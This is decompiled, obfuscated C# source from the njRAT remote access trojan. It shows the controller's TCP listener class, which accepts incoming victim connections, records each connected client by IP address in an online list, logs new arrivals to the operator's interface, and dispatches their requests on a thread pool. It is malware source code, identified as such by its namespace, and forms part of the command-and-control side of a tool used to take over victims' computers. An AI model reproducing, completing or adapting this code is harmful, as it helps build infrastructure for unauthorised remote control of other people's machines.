using System;
using System.Collections.Generic;
using System.Drawing;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace njRAT
{
	// Token: 0x0200004A RID: 74
	public class SK
	{
		// Token: 0x060003F9 RID: 1017 RVA: 0x0002AFBC File Offset: 0x000291BC
		public SK(int port)
		{
			this.\u0002 = false;
			this.S = new TcpListener(port);
			this.S.Server.SendTimeout = -1;
			this.S.Server.ReceiveTimeout = -1;
			this.S.Server.SendBufferSize = 524288;
			this.S.Server.ReceiveBufferSize = 524288;
			this.S.Start(9999);
			ThreadPool.SetMinThreads(250, 250);
			ThreadPool.SetMaxThreads(250, 250);
			this.Online = new Collection();
			this.REQ = new List<\u0008\u2001>();
			int num = 0;
			checked
			{
				do
				{
					this.S.BeginAcceptTcpClient(new AsyncCallback(this.accept), null);
					num++;
				}
				while (num <= 10);
				int num2 = 1;
				do
				{
					Thread thread = new Thread(delegate(object \u0002)
					{
						this.tp(Conversions.ToInteger(\u0002));
					});
					thread.Start(num2);
					num2++;
				}
				while (num2 <= 16);
			}
		}

		// Token: 0x060003FA RID: 1018 RVA: 0x0002B0C4 File Offset: 0x000292C4
		public void tp(int i)
		{
			for (;;)
			{
				Thread.Sleep(1);
				\u0008\u2001 u0008_u = null;
				List<\u0008\u2001> req = this.REQ;
				lock (req)
				{
					if (this.REQ.Count > 0)
					{
						u0008_u = this.REQ[0];
						this.REQ.RemoveAt(0);
					}
				}
				if (u0008_u != null)
				{
					\u000E\u2000.\u0003(new object[]
					{
						u0008_u.\u0002,
						u0008_u.\u0003
					});
					u0008_u.\u0005 = true;
				}
			}
		}

		// Token: 0x060003FB RID: 1019 RVA: 0x0002B15C File Offset: 0x0002935C
		public Client GetClient(string ID)
		{
			Collection online = this.Online;
			Client result;
			lock (online)
			{
				try
				{
					result = (Client)this.Online[ID];
				}
				catch (Exception ex)
				{
					result = null;
				}
			}
			return result;
		}

		// Token: 0x060003FC RID: 1020 RVA: 0x0002B1C4 File Offset: 0x000293C4
		public void accept(IAsyncResult ar)
		{
			try
			{
				Client client = new Client(this.S.EndAcceptTcpClient(ar), this);
				client.Client.ReceiveTimeout = -1;
				client.Client.SendTimeout = -1;
				client.Client.SendBufferSize = 524288;
				client.Client.ReceiveBufferSize = 524288;
				if (\u000E\u2000.\u0002.\u0005)
				{
					\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(new object[]
					{
						Color.LightSteelBlue,
						\u000E.\u0002(),
						client.COI,
						Color.GreenYellow,
						client.ip(),
						\u0006\u2001.\u0002(-1829118593)
					});
				}
				Collection online = this.Online;
				lock (online)
				{
					this.Online.Add(client, client.ip(), null, null);
				}
			}
			catch (Exception ex)
			{
			}
			Thread.Sleep(1);
			this.S.BeginAcceptTcpClient(new AsyncCallback(this.accept), null);
		}

		// Token: 0x0400025A RID: 602
		public TcpListener S;

		// Token: 0x0400025B RID: 603
		public Collection Online;

		// Token: 0x0400025C RID: 604
		private bool \u0002;

		// Token: 0x0400025D RID: 605
		public List<\u0008\u2001> REQ;
	}
}
